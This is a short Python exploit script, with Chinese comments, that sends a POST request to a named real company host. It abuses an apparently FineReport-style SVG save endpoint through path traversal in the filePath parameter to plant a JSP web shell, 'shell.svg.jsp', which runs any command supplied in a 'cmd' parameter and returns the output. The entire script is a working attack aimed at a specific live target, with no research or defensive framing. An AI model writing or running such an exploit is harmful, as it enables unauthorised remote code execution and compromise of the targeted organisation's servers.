import requests

# 目标 URL
url = "https://jbt.taikang.com/cis"

# 请求参数（URL 参数）
params = {
    "op": "svginit",
    "cmd": "design_save_svg",
    "filePath": "chartmapsvg/../../../..WebReport/shell.svg.jsp"
}

# POST 请求数据
data = {
    "__CONTENT__": """<% 
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    while ((a = in.read(b)) != -1) { out.println(new String(b)); }
    %>""",
    "__CHARSET__": "UTF-8"
}

# 发送 POST 请求
response = requests.post(url, params=params, json=data)

# 输出响应
print("状态码:", response.status_code)
print("响应内容:", response.text)